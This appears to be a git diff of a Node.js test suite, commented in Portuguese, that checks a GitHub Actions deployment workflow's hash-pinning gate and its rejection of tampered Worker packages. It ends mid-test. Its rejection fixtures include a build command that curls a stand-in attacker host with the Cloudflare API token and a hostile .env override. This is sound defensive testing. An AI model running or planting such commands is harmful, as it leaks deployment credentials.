@@ -5,6 +5,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import fs from "node:fs";
+import crypto from "node:crypto";
 import os from "node:os";
 import path from "node:path";
 import { spawnSync } from "node:child_process";
@@ -67,17 +68,19 @@ test("a entrada commit só passa por env e por ref do checkout, e é validada (4
     for (const p of passosDe(j).filter((x) => /\n        run: \|/.test(x))) assert.ok(!/\$\{\{/.test(script(p)), n + ": expressão do GitHub dentro de script em " + nomeDe(p));
   }
   const usos = [...WF.matchAll(/inputs\.commit/g)].length;
-  assert.equal(usos, 4, "três env COMMIT (guarda, montagem e empacotamento) e uma ref do checkout");
+  assert.equal(usos, 5, "quatro env COMMIT (guarda, pin, montagem e empacotamento) e uma ref do checkout");
   assert.match(WF, /ref: \$\{\{ inputs\.commit \}\}/);
-  assert.equal([...WF.matchAll(/^\s+COMMIT: \$\{\{ inputs\.commit \}\}\s*$/gm)].length, 3);
+  assert.equal([...WF.matchAll(/^\s+COMMIT: \$\{\{ inputs\.commit \}\}\s*$/gm)].length, 4);
   assert.ok(nomeDe(PV[0]).startsWith("Só na main e com um commit válido"), "a validação é o primeiro passo");
   assert.ok(!/inputs\./.test(J.provisionar), "o provisionar não usa nenhuma entrada");
   assert.ok(!/inputs\.commit/.test(J.executar), "só o job verificar usa o commit");
   // a operação só aparece em condições `if:` (nunca em script nem em env), onde é uma comparação com valor fixo da lista fechada
   const usosOp = [...WF.matchAll(/inputs\.operacao/g)].length;
   const emIf = [...WF.matchAll(/^        if: \$\{\{ inputs\.operacao == '(validar_uso_unico|p1_imap|p2_imap)' \}\}\s*$/gm)].length;
-  assert.equal(usosOp, 3);
+  assert.equal(usosOp, 4, "três condições if e UMA variável de ambiente (a do passo do pin)");
   assert.equal(emIf, 3);
+  assert.equal([...WF.matchAll(/^          OPERACAO: \$\{\{ inputs\.operacao \}\}\s*$/gm)].length, 1);
+  assert.ok(achar(PV, "Conferir o pin").includes("OPERACAO: ${{ inputs.operacao }}"), "a operação só entra por env no passo do pin");
   assert.equal([...WF.matchAll(/inputs\.uid_mensagem/g)].length, 1, "o UID só entra por env do passo da P2");
 });
 
@@ -236,12 +239,12 @@ test("a credencial Apple nunca é citada fora dos passos da P1 e da P2 (nem nos 
 });
 
 test("nada sensível passa entre os jobs: só commit, hash e pacote públicos vão de verificar para provisionar; executar não lê nada", () => {
-  for (const x of [/upload-artifact/, /download-artifact/, /\bcache@/, /GITHUB_ENV/, /GITHUB_PATH/, /\bartifact/i, /steps\.\w+\.outputs\.(?!commit|sha256|pacote)/])
+  for (const x of [/upload-artifact/, /download-artifact/, /\bcache@/, /GITHUB_ENV/, /GITHUB_PATH/, /\bartifact/i, /steps\.\w+\.outputs\.(?!commit|sha256|pacote|nome|manifesto)/])
     assert.ok(!x.test(WF), "mecanismo proibido entre jobs: " + x);
-  const saidas = [...J.verificar.matchAll(/^      (\w+): \$\{\{ steps\.empacotar\.outputs\.(\w+) \}\}\s*$/gm)].map((m) => m[1]);
-  assert.deepEqual(saidas.sort(), ["commit", "pacote", "sha256"]);
+  const saidas = [...J.verificar.matchAll(/^      (\w+): \$\{\{ steps\.(?:empacotar|pin)\.outputs\.(\w+) \}\}\s*$/gm)].map((m) => m[1]);
+  assert.deepEqual(saidas.sort(), ["commit", "manifesto", "pacote", "pin", "sha256"], "só dados públicos: commit, hash, pacote, nome do pin e manifesto");
   assert.ok(!/\boutputs:/.test(J.provisionar) && !/\boutputs:/.test(J.executar) && !/GITHUB_OUTPUT/.test(J.provisionar) && !/GITHUB_OUTPUT/.test(J.executar));
-  assert.deepEqual([...J.provisionar.matchAll(/needs\.(\w+)\.outputs\.(\w+)/g)].map((m) => m[1] + "." + m[2]).sort(), ["verificar.commit", "verificar.pacote", "verificar.sha256"]);
+  assert.deepEqual([...J.provisionar.matchAll(/needs\.(\w+)\.outputs\.(\w+)/g)].map((m) => m[1] + "." + m[2]).sort(), ["verificar.commit", "verificar.manifesto", "verificar.pacote", "verificar.pin", "verificar.sha256"]);
   assert.ok(!/needs\./.test(J.executar.replace(/^    needs: provisionar\s*$/m, "")));
 });
 
@@ -264,7 +267,7 @@ test("actions oficiais fixadas por SHA (conferidos nos repositórios oficiais) e
   const sem = Object.entries(lock.packages).filter(([k, v]) => k !== "" && (!v.integrity || !/^https:\/\/registry\.npmjs\.org\//.test(v.resolved || ""))).map(([k]) => k);
   assert.deepEqual(sem, []);
   for (const alvo of ["", dir]) assert.ok(!existe(alvo + ".npmrc"));
-  assert.deepEqual(fs.readdirSync(new URL(dir, raiz)).sort(), ["README.md", "package-lock.json", "package.json"]);
+  assert.deepEqual(fs.readdirSync(new URL(dir, raiz)).sort(), ["README.md", "aprovados.json", "package-lock.json", "package.json"]);
 });
 
 const ARQS_WORKER = ["politica", "jwt", "jwks", "consumo", "imap", "mime", "mensagem", "rotas", "index"];
@@ -273,9 +276,10 @@ const CFG_FIXA = { name: "rac-icloud-auth-poc", main: "src/index.mjs", compatibi
 
 test("integridade do pacote: lista fixa, config única escrita no workflow (com o Durable Object), dry-run, inspeção, sha256 e publicação do mesmo arquivo sem bundle", () => {
   const montar = achar(PV, "Montar o pacote");
-  assert.match(montar, /ESPERADO=\$'\.\/README\.md\\n\.\/src\/consumo\.mjs\\n\.\/src\/imap\.mjs\\n\.\/src\/index\.mjs\\n\.\/src\/jwks\.mjs\\n\.\/src\/jwt\.mjs\\n\.\/src\/mensagem\.mjs\\n\.\/src\/mime\.mjs\\n\.\/src\/politica\.mjs\\n\.\/src\/rotas\.mjs\\n\.\/wrangler\.jsonc'/);
-  assert.match(montar, /find "\$BASE" -type l/);
-  assert.match(montar, /for ARQ in politica jwt jwks consumo imap mime mensagem rotas index; do cp "\$BASE\/src\/\$ARQ\.mjs"/);
+  assert.match(montar, /git -C poc cat-file blob "HEAD:\$RAIZ\/\$ARQ" > "\$PACOTE\/\$ARQ"/, "os arquivos vêm dos objetos do Git, os mesmos que o pin conferiu");
+  assert.match(montar, /done < "\$RUNNER_TEMP\/pin-hashes\.sha256"/, "a lista de arquivos vem do pin conferido, não de uma lista escrita no workflow");
+  assert.match(montar, /sha256sum -c --quiet -/, "os arquivos copiados são reconferidos contra o pin");
+  assert.ok(!/ESPERADO=|for ARQ in politica/.test(WF), "nenhuma lista de arquivos fixa e escrita à mão: ela é a do pin");
   const heredoc = (j) => JSON.parse(new RegExp("<<'JSON'\\n([\\s\\S]*?)\\n\\s*JSON\\n").exec(j)[1].replace(/^\s{10}/gm, ""));
   const cfgV = heredoc(J.verificar), cfgP = heredoc(J.provisionar);
   assert.deepEqual(cfgV, CFG_FIXA, "a configuração fixa do verificar é exatamente esta (Durable Object CONSUMO com SQLite e migração v1; nenhuma outra chave)");
@@ -317,18 +321,6 @@ const TMPS = [];
 function tmp() { const d = fs.mkdtempSync(path.join(os.tmpdir(), "rac-wf-")); TMPS.push(d); return d; }
 process.on("exit", () => { for (const d of TMPS) fs.rmSync(d, { recursive: true, force: true }); });
 const CFG = { $schema: "node_modules/wrangler/config-schema.json", ...CFG_FIXA };
-function fixture({ extra = {}, cfg = CFG } = {}) {
-  const ws = tmp(), base = path.join(ws, "poc/experimentos/icloud-auth-probe");
-  fs.mkdirSync(path.join(base, "src"), { recursive: true });
-  fs.writeFileSync(path.join(base, "README.md"), "# poc\n");
-  fs.writeFileSync(path.join(base, "wrangler.jsonc"), JSON.stringify(cfg, null, 2));
-  for (const n of ARQS_WORKER) fs.writeFileSync(path.join(base, "src", n + ".mjs"), "export const " + n + " = 1;\n");
-  for (const [rel, conteudo] of Object.entries(extra)) { fs.mkdirSync(path.dirname(path.join(base, rel)), { recursive: true }); fs.writeFileSync(path.join(base, rel), conteudo); }
-  const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@example.test", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.test" };
-  const g = (...a) => spawnSync("git", ["-C", path.join(ws, "poc"), ...a], { env, encoding: "utf8" });
-  g("init", "-q"); g("add", "-A"); g("-c", "commit.gpgsign=false", "commit", "-q", "-m", "x");
-  return { ws, base, commit: g("rev-parse", "HEAD").stdout.trim() };
-}
 function rodar(passo, { cwd, env = {} }) {
   const tempDir = tmp();
   const r = spawnSync("bash", ["-e", "-o", "pipefail", "-c", script(passo)], { cwd, encoding: "utf8", env: { PATH: process.env.PATH, HOME: tempDir, RUNNER_TEMP: tempDir, GITHUB_WORKSPACE: cwd, GITHUB_STEP_SUMMARY: path.join(tempDir, "resumo.md"), GITHUB_OUTPUT: path.join(tempDir, "saida.txt"), ...env } });
@@ -346,40 +338,239 @@ test("EXECUÇÃO — guarda da entrada: só a main e só 40 hexadecimais minúsc
     assert.notEqual(rodar(passo, { cwd: tmp(), env }).status, 0, nome);
 });
 
-test("EXECUÇÃO — montagem do pacote: aceita só a lista fixa de arquivos regulares, com a config equivalente à do workflow", { skip: semFerramentas }, () => {
-  const passo = achar(PV, "Montar o pacote");
-  const bom = fixture();
-  const r = rodar(passo, { cwd: bom.ws, env: { COMMIT: bom.commit } });
-  assert.equal(r.status, 0, r.stderr);
-  const pacote = path.join(r.tempDir, "pacote");
-  assert.deepEqual(fs.readdirSync(path.join(pacote, "src")).sort(), ["consumo.mjs", "imap.mjs", "index.mjs", "jwks.mjs", "jwt.mjs", "mensagem.mjs", "mime.mjs", "politica.mjs", "rotas.mjs"]);
+// ---------- portão do pin: os passos REAIS "Conferir o pin" e "Montar o pacote", em sequência, contra repositórios Git de fixture ----------
+const NOMES_P1 = ["consumo", "imap", "index", "jwks", "jwt", "politica", "rotas"];
+const NOMES_P2 = [...NOMES_P1, "mensagem", "mime"];
+const conteudoDe = (perfil, cfg = CFG) => {
+  const m = { "wrangler.jsonc": JSON.stringify(cfg, null, 2) };
+  for (const n of perfil === "p1" ? NOMES_P1 : NOMES_P2) m["src/" + n + ".mjs"] = "export const " + n + " = '" + perfil + "';\n";
+  return m;
+};
+const sha = (b) => crypto.createHash("sha256").update(b).digest("hex");
+const manifestoDe = (arquivos) => sha("rac-pin-v1\n" + Object.keys(arquivos).sort().map((k) => arquivos[k] + "  " + k + "\n").join(""));
+function pinDe(perfil, cfg = CFG) {
+  const arquivos = {};
+  for (const [p, c] of Object.entries(conteudoDe(perfil, cfg)).sort(([a], [b]) => (a < b ? -1 : 1))) arquivos[p] = sha(c);
+  return { commit_referencia: perfil === "p1" ? "1".repeat(40) : "2".repeat(40), manifesto_sha256: manifestoDe(arquivos), arquivos };
+}
+const OPERACOES_PIN = { validar_oidc: ["p1", "p2"], validar_uso_unico: ["p1", "p2"], p1_imap: ["p1"], p2_imap: ["p2"] };
+const pinCompleto = (cfg = CFG) => ({ formato: "rac-pin-v1", operacoes: OPERACOES_PIN, pins: { p1: pinDe("p1"), p2: pinDe("p2") } });
+const ARQ_PIN = "experimentos/icloud-auth-probe-ferramenta/aprovados.json";
+// fixture: o repositório da POC (commit com o conteúdo do perfil, mais README) e o pin da "main" (ws/experimentos/...). `pin`: objeto, texto ou null (sem arquivo).
+function fixture({ perfil = "p2", extra = {}, remover = [], cfg = CFG, pin, executavel = [], links = {}, gitlinks = [], attrs = null } = {}) {
+  const ws = tmp(), poc = path.join(ws, "poc"), base = path.join(poc, "experimentos/icloud-auth-probe");
+  const arqs = { "README.md": "# poc\n", ...conteudoDe(perfil, cfg), ...extra };
+  for (const r of remover) delete arqs[r];
+  for (const [rel, c] of Object.entries(arqs)) { fs.mkdirSync(path.dirname(path.join(base, rel)), { recursive: true }); fs.writeFileSync(path.join(base, rel), c); }
+  for (const rel of executavel) fs.chmodSync(path.join(base, rel), 0o755);
+  for (const [rel, alvo] of Object.entries(links)) { fs.rmSync(path.join(base, rel), { force: true }); fs.symlinkSync(alvo, path.join(base, rel)); }
+  if (attrs) fs.writeFileSync(path.join(poc, ".gitattributes"), attrs);
+  const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@example.test", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.test" };
+  const g = (...a) => spawnSync("git", ["-C", poc, ...a], { env, encoding: "utf8" });
+  g("init", "-q"); g("config", "core.autocrlf", "false"); g("add", "-A");
+  for (const rel of gitlinks) g("update-index", "--add", "--cacheinfo", "160000," + "a".repeat(40) + ",experimentos/icloud-auth-probe/" + rel);
+  g("-c", "commit.gpgsign=false", "commit", "-q", "-m", "x");
+  const arq = path.join(ws, ARQ_PIN);
+  if (pin !== null) { fs.mkdirSync(path.dirname(arq), { recursive: true }); fs.writeFileSync(arq, typeof pin === "string" ? pin : JSON.stringify(pin === undefined ? pinCompleto() : pin, null, 2)); }
+  return { ws, base, poc, commit: g("rev-parse", "HEAD").stdout.trim() };
+}
+// roda os passos em sequência, na mesma pasta temporária (como no job), parando no primeiro que falhar
+function rodarSeq(passos, { cwd, env = {} }) {
+  const tempDir = tmp();
+  const saida = { status: 0, etapa: null, out: "", err: "", tempDir };
+  for (const p of passos) {
+    const r = spawnSync("bash", ["-e", "-o", "pipefail", "-c", script(p)], { cwd, encoding: "utf8", env: { PATH: process.env.PATH, HOME: tempDir, RUNNER_TEMP: tempDir, GITHUB_WORKSPACE: cwd, GITHUB_STEP_SUMMARY: path.join(tempDir, "resumo.md"), GITHUB_OUTPUT: path.join(tempDir, "saida.txt"), ...env } });
+    saida.out += r.stdout; saida.err += r.stderr;
+    if (r.status !== 0) { saida.status = r.status; saida.etapa = nomeDe(p); break; }
+  }
+  return saida;
+}
+const PIN_PASSO = achar(PV, "Conferir o pin"), MONTAR_PASSO = achar(PV, "Montar o pacote");
+const porta = (fx, operacao, env = {}) => rodarSeq([PIN_PASSO, MONTAR_PASSO], { cwd: fx.ws, env: { COMMIT: fx.commit, OPERACAO: operacao, ...env } });
+const soPin = (fx, operacao, env = {}) => rodarSeq([PIN_PASSO], { cwd: fx.ws, env: { COMMIT: fx.commit, OPERACAO: operacao, ...env } });
+const lerTemp = (r, a) => fs.readFileSync(path.join(r.tempDir, a), "utf8");
+const recusaNoPin = (nome, fx, operacao = "p2_imap", env = {}) => { const r = porta(fx, operacao, env); assert.notEqual(r.status, 0, nome); assert.match(r.etapa, /^Conferir o pin/, nome + ": a recusa acontece NO PORTÃO, antes de montar"); assert.ok(!fs.existsSync(path.join(r.tempDir, "pacote")), nome + ": nada foi montado"); return r; };
+
+test("EXECUÇÃO — pin: cada operação aceita só o conteúdo do SEU pin (p1_imap só o P1, p2_imap só o P2); as operações sem credencial aceitam os dois", { skip: semFerramentas }, () => {
+  const p2 = porta(fixture({ perfil: "p2" }), "p2_imap");
+  assert.equal(p2.status, 0, p2.err + p2.out);
+  assert.match(lerTemp(p2, "saida.txt"), /^nome=p2$/m); assert.match(lerTemp(p2, "saida.txt"), new RegExp("^manifesto=" + pinDe("p2").manifesto_sha256 + "$", "m"));
+  const pacote = path.join(p2.tempDir, "pacote");
+  assert.deepEqual(fs.readdirSync(path.join(pacote, "src")).sort(), NOMES_P2.map((n) => n + ".mjs").sort());
   assert.deepEqual(JSON.parse(fs.readFileSync(path.join(pacote, "wrangler.jsonc"), "utf8")), CFG_FIXA);
-  const fontes = fs.readFileSync(path.join(r.tempDir, "fontes.sha256"), "utf8");
-  for (const n of ARQS_WORKER) assert.match(fontes, new RegExp("src/" + n + "\\.mjs"));
-  const recusar = (nome, f, env) => { const x = rodar(passo, { cwd: f.ws, env: { COMMIT: f.commit, ...env } }); assert.notEqual(x.status, 0, nome); return x; };
-  recusar("arquivo .env escondido", fixture({ extra: { ".env": "CLOUDFLARE_API_BASE_URL=https://atacante.exemplo\n" } }));
-  recusar(".dev.vars", fixture({ extra: { ".dev.vars": "X=1\n" } }));
-  recusar("package.json extra", fixture({ extra: { "package.json": "{}" } }));
-  recusar("wrangler.toml extra", fixture({ extra: { "wrangler.toml": "name='x'" } }));
-  recusar("arquivo extra em src", fixture({ extra: { "src/extra.mjs": "export {};\n" } }));
-  recusar("build.command na config", fixture({ cfg: { ...CFG, build: { command: "curl https://atacante.exemplo/$CLOUDFLARE_API_TOKEN" } } }));
-  recusar("vars na config", fixture({ cfg: { ...CFG, vars: { X: "1" } } }));
-  recusar("KV na config", fixture({ cfg: { ...CFG, kv_namespaces: [{ binding: "K", id: "x" }] } }));
-  recusar("segundo Durable Object", fixture({ cfg: { ...CFG, durable_objects: { bindings: [...CFG.durable_objects.bindings, { name: "OUTRO", class_name: "Outro" }] } } }));
-  recusar("classe do Durable Object diferente", fixture({ cfg: { ...CFG, durable_objects: { bindings: [{ name: "CONSUMO", class_name: "OutraClasse" }] } } }));
-  recusar("migração com armazenamento clássico (sem SQLite)", fixture({ cfg: { ...CFG, migrations: [{ tag: "v1", new_classes: ["ConsumoUnico"] }] } }));
-  recusar("migração que apaga a classe", fixture({ cfg: { ...CFG, migrations: [...CFG.migrations, { tag: "v2", deleted_classes: ["ConsumoUnico"] }] } }));
-  recusar("sem o Durable Object na config", fixture({ cfg: (({ durable_objects, migrations, ...resto }) => resto)(CFG) }));
-  const faltando = fixture(); fs.rmSync(path.join(faltando.base, "src/imap.mjs")); spawnSync("git", ["-C", path.join(faltando.ws, "poc"), "add", "-A"]); 
-  recusar("arquivo da lista fixa ausente", faltando);
-  recusar("outra rota na config", fixture({ cfg: { ...CFG, routes: ["x.exemplo/*"] } }));
-  const comLink = fixture();
-  fs.rmSync(path.join(comLink.base, "src/index.mjs")); fs.symlinkSync("/etc/hostname", path.join(comLink.base, "src/index.mjs"));
-  recusar("link simbólico no lugar de um arquivo", comLink);
-  const errado = fixture();
-  recusar("commit diferente do checkout", errado, { COMMIT: "f".repeat(40) });
-  const semPasta = tmp();
-  assert.notEqual(rodar(passo, { cwd: semPasta, env: { COMMIT: "a".repeat(40) } }).status, 0, "sem a pasta do Worker");
+  const fontes = lerTemp(p2, "fontes.sha256");
+  for (const n of NOMES_P2) assert.match(fontes, new RegExp("src/" + n + "\\.mjs"));
+  assert.match(lerTemp(p2, "resumo.md"), /pin: \*\*p2\*\*/);
+  const p1 = porta(fixture({ perfil: "p1" }), "p1_imap");
+  assert.equal(p1.status, 0, p1.err + p1.out);
+  assert.match(lerTemp(p1, "saida.txt"), /^nome=p1$/m);
+  assert.deepEqual(fs.readdirSync(path.join(p1.tempDir, "pacote/src")).sort(), NOMES_P1.map((n) => n + ".mjs").sort(), "o pacote P1 não tem os módulos da P2");
+  for (const op of ["validar_oidc", "validar_uso_unico"]) for (const perfil of ["p1", "p2"]) { const r = porta(fixture({ perfil }), op); assert.equal(r.status, 0, op + " " + perfil + r.err); assert.match(lerTemp(r, "saida.txt"), new RegExp("^nome=" + perfil + "$", "m")); }
+  // associação explícita: conteúdo certo para a OUTRA operação é recusado
+  const cruzada1 = recusaNoPin("conteúdo P2 com p1_imap", fixture({ perfil: "p2" }), "p1_imap");
+  const cruzada2 = recusaNoPin("conteúdo P1 com p2_imap", fixture({ perfil: "p1" }), "p2_imap");
+  for (const c of [cruzada1, cruzada2]) assert.match(c.out + c.err, /não corresponde a nenhum pin aprovado para a operação/);
+});
+
+test("EXECUÇÃO — pin: byte alterado, arquivo ausente, extra, renomeado, em subpasta, escondido ou com nome fora do padrão são recusados no portão (nada é montado)", { skip: semFerramentas }, () => {
+  const fx = (o) => fixture({ perfil: "p2", ...o });
+  recusaNoPin("um byte a mais numa fonte", fx({ extra: { "src/rotas.mjs": conteudoDe("p2")["src/rotas.mjs"] + " " } }));
+  recusaNoPin("uma fonte trocada por código diferente", fx({ extra: { "src/index.mjs": "export default { fetch() { return new Response('x'); } };\n" } }));
+  recusaNoPin("mensagem.mjs alterada (só o P2 a tem)", fx({ extra: { "src/mensagem.mjs": "export const mensagem = 'outra';\n" } }));
+  recusaNoPin("README sozinho não basta: arquivo da lista ausente", fx({ remover: ["src/imap.mjs"] }));
+  recusaNoPin("wrangler.jsonc ausente", fx({ remover: ["wrangler.jsonc"] }));
+  recusaNoPin("arquivo extra em src", fx({ extra: { "src/extra.mjs": "export {};\n" } }));
+  recusaNoPin("arquivo extra na raiz do Worker", fx({ extra: { "extra.mjs": "export {};\n" } }));
+  recusaNoPin(".env escondido", fx({ extra: { ".env": "CLOUDFLARE_API_BASE_URL=https://atacante.exemplo\n" } }));
+  recusaNoPin(".dev.vars", fx({ extra: { ".dev.vars": "X=1\n" } }));
+  recusaNoPin("package.json extra", fx({ extra: { "package.json": "{}" } }));
+  recusaNoPin("wrangler.toml extra", fx({ extra: { "wrangler.toml": "name='x'" } }));
+  recusaNoPin("subpasta extra", fx({ extra: { "src/sub/x.mjs": "export {};\n" } }));
+  recusaNoPin("arquivo renomeado (mesmo conteúdo, outro caminho)", fx({ remover: ["src/jwt.mjs"], extra: { "src/jwt2.mjs": conteudoDe("p2")["src/jwt.mjs"] } }));
+  recusaNoPin("arquivo movido para subpasta", fx({ remover: ["src/jwt.mjs"], extra: { "src/sub/jwt.mjs": conteudoDe("p2")["src/jwt.mjs"] } }));
+  recusaNoPin("nome com espaço", fx({ extra: { "src/a b.mjs": "x" } }));
+  recusaNoPin("nome com caractere especial", fx({ extra: { "src/a$b.mjs": "x" } }));
+  recusaNoPin("README ausente não compensa arquivo extra", fx({ remover: ["README.md"], extra: { "outro.txt": "x" } }));
+});
+
+test("EXECUÇÃO — pin: link simbólico, submódulo e arquivo executável são recusados; um .gitattributes no commit não altera o que é conferido nem empacotado", { skip: semFerramentas }, () => {
+  recusaNoPin("link simbólico no lugar de um arquivo", fixture({ links: { "src/index.mjs": "/etc/hostname" } }));
+  recusaNoPin("link simbólico extra", fixture({ links: { "src/extra.mjs": "/etc/hostname" } }));
+  recusaNoPin("submódulo (gitlink)", fixture({ gitlinks: ["src/sub"] }));
+  recusaNoPin("modo executável", fixture({ executavel: ["src/rotas.mjs"] }));
+  // .gitattributes tentando converter fim de linha: os hashes e a cópia usam os objetos do Git, então nada muda
+  const a = fixture({ attrs: "* text eol=crlf\n*.mjs -text\n" });
+  const r = porta(a, "p2_imap");
+  assert.equal(r.status, 0, r.err);
+  assert.equal(fs.readFileSync(path.join(r.tempDir, "pacote/src/rotas.mjs"), "utf8"), conteudoDe("p2")["src/rotas.mjs"], "bytes idênticos ao objeto do Git");
+});
+
+test("EXECUÇÃO — pin: arquivo de pins ausente, inválido, inconsistente ou fora do formato derruba o portão; a operação desconhecida e o commit trocado também; nenhuma variável o substitui", { skip: semFerramentas }, () => {
+  const bom = pinCompleto();
+  const com = (f) => { const x = structuredClone(bom); f(x); return x; };
+  recusaNoPin("sem o arquivo de pins", fixture({ pin: null }));
+  recusaNoPin("JSON inválido", fixture({ pin: "{nao json" }));
+  recusaNoPin("formato desconhecido", fixture({ pin: com((x) => { x.formato = "rac-pin-v2"; }) }));
+  recusaNoPin("sem a tabela de operações", fixture({ pin: com((x) => { delete x.operacoes; }) }));
+  recusaNoPin("operação sem pin (a tabela não a conhece)", fixture({}), "p3_imap");
+  recusaNoPin("operação vazia", fixture({}), "");
+  recusaNoPin("operação aponta para pin inexistente", fixture({ pin: com((x) => { x.operacoes.p2_imap = ["p9"]; }) }));
+  recusaNoPin("manifesto não bate com a lista do próprio pin", fixture({ pin: com((x) => { x.pins.p2.manifesto_sha256 = "0".repeat(64); }) }));
+  recusaNoPin("hash de arquivo do pin alterado (inconsistente com o manifesto)", fixture({ pin: com((x) => { x.pins.p2.arquivos["src/rotas.mjs"] = "f".repeat(64); }) }));
+  recusaNoPin("manifesto com maiúsculas", fixture({ pin: com((x) => { x.pins.p2.manifesto_sha256 = x.pins.p2.manifesto_sha256.toUpperCase(); }) }));
+  recusaNoPin("caminho fora do padrão no pin", fixture({ pin: com((x) => { x.pins.p2.arquivos["../x.mjs"] = "a".repeat(64); }) }));
+  recusaNoPin("pin sem wrangler.jsonc", fixture({ pin: com((x) => { delete x.pins.p2.arquivos["wrangler.jsonc"]; }) }));
+  recusaNoPin("pin sem commit de referência", fixture({ pin: com((x) => { delete x.pins.p2.commit_referencia; }) }));
+  recusaNoPin("commit diferente do checkout", fixture({}), "p2_imap", { COMMIT: "f".repeat(40) });
+  const semPasta = tmp(); fs.mkdirSync(path.join(semPasta, "experimentos/icloud-auth-probe-ferramenta"), { recursive: true });
+  fs.writeFileSync(path.join(semPasta, ARQ_PIN), JSON.stringify(bom)); spawnSync("git", ["init", "-q", path.join(semPasta, "poc")]);
+  assert.notEqual(rodarSeq([PIN_PASSO], { cwd: semPasta, env: { COMMIT: "a".repeat(40), OPERACAO: "p2_imap" } }).status, 0, "sem a pasta do Worker");
+  // nenhuma variável de ambiente troca o pin: um pin "malicioso" que aprova o conteúdo adulterado, apontado por variáveis comuns, é ignorado
+  const adulterado = fixture({ extra: { "src/rotas.mjs": "export const rotas = 'malicioso';\n" } });
+  const pinMalicioso = tmp(); const arqMal = path.join(pinMalicioso, "aprovados.json");
+  const malp2 = pinDe("p2"); malp2.arquivos["src/rotas.mjs"] = sha("export const rotas = 'malicioso';\n"); malp2.manifesto_sha256 = manifestoDe(malp2.arquivos);
+  fs.writeFileSync(arqMal, JSON.stringify({ ...bom, pins: { ...bom.pins, p2: malp2 } }));
+  recusaNoPin("pin substituído por variável", adulterado, "p2_imap", { PIN: arqMal, PIN_FILE: arqMal, APROVADOS: arqMal, RAIZ: "x", ACEITO: "p2", LISTA: "x" });
+});
+
+test("EXECUÇÃO — pin aprovado, mas configuração do Wrangler adulterada: o pin passa (se o pin foi gerado do conteúdo adulterado) e a equivalência com a configuração fixa derruba a montagem", { skip: semFerramentas }, () => {
+  const cfgs = [["build.command", { ...CFG, build: { command: "curl https://atacante.exemplo/$CLOUDFLARE_API_TOKEN" } }], ["vars", { ...CFG, vars: { X: "1" } }], ["KV", { ...CFG, kv_namespaces: [{ binding: "K", id: "x" }] }],
+    ["segundo Durable Object", { ...CFG, durable_objects: { bindings: [...CFG.durable_objects.bindings, { name: "OUTRO", class_name: "Outro" }] } }],
+    ["classe do Durable Object diferente", { ...CFG, durable_objects: { bindings: [{ name: "CONSUMO", class_name: "OutraClasse" }] } }],
+    ["migração sem SQLite", { ...CFG, migrations: [{ tag: "v1", new_classes: ["ConsumoUnico"] }] }], ["migração que apaga a classe", { ...CFG, migrations: [...CFG.migrations, { tag: "v2", deleted_classes: ["ConsumoUnico"] }] }],
+    ["sem Durable Object", (({ durable_objects, migrations, ...resto }) => resto)(CFG)], ["outra rota", { ...CFG, routes: ["x.exemplo/*"] }], ["compatibility_date diferente", { ...CFG, compatibility_date: "2020-01-01" }],
+    ["main diferente", { ...CFG, main: "src/outro.mjs" }], ["flag de compatibilidade", { ...CFG, compatibility_flags: ["nodejs_compat"] }]];
+  for (const [nome, cfg] of cfgs) {
+    // (1) pin legítimo + configuração adulterada no commit: recusado no portão (o hash do wrangler.jsonc difere)
+    recusaNoPin(nome + " (pin legítimo)", fixture({ cfg }));
+    // (2) pin gerado do conteúdo adulterado: o portão passa, mas a equivalência com a configuração fixa do workflow barra a montagem
+    const p2 = pinDe("p2", cfg);
+    const fx = fixture({ cfg, pin: { ...pinCompleto(), pins: { ...pinCompleto().pins, p2 } } });
+    const r = porta(fx, "p2_imap");
+    assert.notEqual(r.status, 0, nome + " (pin do conteúdo adulterado)");
+    assert.match(r.etapa, /^Montar o pacote/, nome + ": falhou na montagem");
+    assert.match(r.out + r.err, /difere da configuração fixa/, nome);
+  }
+  // só a diferença do "$schema" é ignorada (o próprio Wrangler a aceita)
+  assert.equal(porta(fixture({ cfg: { $schema: "node_modules/wrangler/config-schema.json", ...CFG }, pin: { ...pinCompleto(), pins: { ...pinCompleto().pins, p2: pinDe("p2", { $schema: "node_modules/wrangler/config-schema.json", ...CFG }) } } }), "p2_imap").status, 0);
+});
+
+test("limite de tamanho do pacote: o passo de empacotar recusa, no job sem secrets, o que não caberia na variável de ambiente do job seguinte", () => {
+  const emp = script(achar(PV, "Empacotar"));
+  assert.match(emp, /PACOTE_B64=\$\(base64 -w0 "\$BUNDLE"\)/);
+  assert.match(emp, /\[ "\$\{#PACOTE_B64\}" -gt 120000 \]/);
+  assert.match(emp, /echo "pacote=\$PACOTE_B64"/);
+  assert.ok(emp.indexOf("-gt 120000") < emp.indexOf('echo "pacote='), "a conferência vem antes de gravar a saída");
+});
+
+test("CODEOWNERS: os caminhos sensíveis (workflows, ferramenta e o próprio CODEOWNERS) pertencem só ao dono; sem curingas que sobrescrevam", () => {
+  assert.ok(existe(".github/CODEOWNERS"));
+  assert.ok(!existe("CODEOWNERS") && !existe("docs/CODEOWNERS"), "um único arquivo, no lugar que o GitHub lê primeiro");
+  const linhas = ler(".github/CODEOWNERS").split("\n").map((l) => l.trim()).filter((l) => l && !l.startsWith("#"));
+  assert.deepEqual(linhas, ["/.github/workflows/ @raynercarvalho1", "/experimentos/icloud-auth-probe-ferramenta/ @raynercarvalho1", "/.github/CODEOWNERS @raynercarvalho1"]);
+  for (const l of linhas) assert.match(l, /^\/[A-Za-z0-9._\/-]+ @raynercarvalho1$/, "caminho absoluto a partir da raiz e um único dono");
+  assert.ok(!linhas.some((l) => /^\*|\s\*|\*\*/.test(l)), "sem curinga global que enfraqueça ou substitua");
+  const guia = ler("docs/icloud-poc-deploy.md");
+  for (const x of [/CODEOWNERS/, /Require review from Code Owners/i, /bypass/i, /github-actions\[bot\]/]) assert.match(guia, x, "o guia explica a regra de revisão e seus limites: " + x);
+});
+
+test("o pin do portão: ordem dos passos, sem secrets nem Environment, só leitura da main, falha antes de qualquer job privilegiado", () => {
+  const nomes = PV.map(nomeDe);
+  const ip = nomes.findIndex((n) => n.startsWith("Conferir o pin")), im = nomes.findIndex((n) => n.startsWith("Montar o pacote")), ie = nomes.findIndex((n) => n.startsWith("Empacotar")), iw = nomes.findIndex((n) => n.startsWith("Instalar o Wrangler"));
